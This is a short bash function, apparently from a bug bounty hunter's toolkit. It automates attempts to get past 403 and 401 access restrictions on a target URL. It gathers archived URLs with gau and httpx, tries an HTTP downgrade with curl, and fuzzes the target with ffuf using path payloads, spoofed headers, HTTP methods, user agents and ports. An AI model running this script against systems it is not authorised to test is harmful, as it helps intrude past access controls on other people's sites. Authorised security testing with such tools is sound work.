bypass(){
    echo -e "\nSTRIPPING HOST FROM URL\n"
    f="$1";f="${f#http://}";f="${f#https://}";f=${f%%/*}

    echo -e "\nSEARCHING GAU FOR CODE 200 URLS\n"
    echo $f | gau | anew -q 403urls.txt
    cat 403urls.txt | httpx -fr -mc 200 -o bypass_403_urls.txt

    echo -e "\nHTTP DOWNGRADE BYPASS\n"
    strip="http://$(echo $1 | sed s/'http[s]\?:\/\/'//)"
    curl -s -L -I $strip | grep ^HTTP

    echo -e "\nTRYING BYPASSES\n"
    ffuf -c -w 403_url_payloads.txt -u $1FUZZ -fc 403,401,400 -s
    ffuf -c -w 403_bypass_header_names.txt:HEADER -w /home/dirac/HACKING/BOUNTIES/TOOLS/40X/403_bypass_header_values.txt:VALUE -u $1 -H "HEADER:VALUE" -fc 403,401,400 -s
    ffuf -c -w http_methods.txt:METHOD -u $1 -X "METHOD" -fc 403,401,400 -s
    ffuf -c -w user_agents.txt:AGENT -u $1 -H "User-Agent: AGENT" -fc 403,401,400 -s
    ffuf -c -w common_http-ports.txt:PORT -u $1 -H "$f:PORT" -fc 403,401,400 -s
}
